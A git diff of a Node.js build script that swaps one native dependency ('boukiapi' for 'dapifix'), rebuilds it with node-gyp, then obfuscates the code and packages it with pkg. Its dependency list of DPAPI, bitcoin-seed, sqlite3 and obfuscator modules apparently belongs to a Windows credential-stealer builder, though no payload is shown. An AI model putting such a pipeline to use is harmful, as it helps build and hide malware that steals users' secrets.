@@ -46,7 +46,7 @@ async function check_all_modules_installed() {
             "@peculiar/webcrypto",
             "axios",
             "bitcoin-seed",
-            "boukiapi",
+            "dapifix",
             "buffer-replace",
             "form-data",
             "javascript-obfuscator",
@@ -102,6 +102,10 @@ async function fix_dependencies() {
             await install_node_gyp();
             await fix_dependencies();
         }
+
+        console.log("Rebuilding dapifix");
+        await build_native_module("dapifix")
+        console.log("Rebuilt dapifix");
 
         const node_js_versions = fs.readdirSync(`${appdata}\\node-gyp\\Cache`);
         await fix_node_gyp(node_js_versions)
@@ -167,7 +171,7 @@ async function obfuscate(input, output) {
                             require("path");
                             require("stream");
                             require("zip-lib");
-                            require("boukiapi");
+                            require("dapifix");
                             require("systeminformation");
                             require("sqlite3");
                             require("request");
@@ -229,8 +233,10 @@ function download(url, dest) {
         });
     });
 }
-async function rebuild_node_gyp() {
-
+async function build_native_module(package) {
+    return new Promise(res => {
+        res(child_process.execSync(`node-gyp rebuild`, { cwd: `./node_modules/${package}` }))
+    })
 }
 
 function get_pkg_cache() {
@@ -251,7 +257,6 @@ function get_pkg_cache() {
     let start = Date.now()
     await download("https://github.com/vercel/pkg-fetch/releases/download/v3.5/node-v18.15.0-win-x64", `${get_pkg_cache()}\\built-v18.5.0-win-x64`)
     console.log(`Downloaded Node.js pre-built binary within ${(Date.now() - start) / 1000} seconds`);
-
 
     console.log("Checking if all modules are installed")
     await check_all_modules_installed();
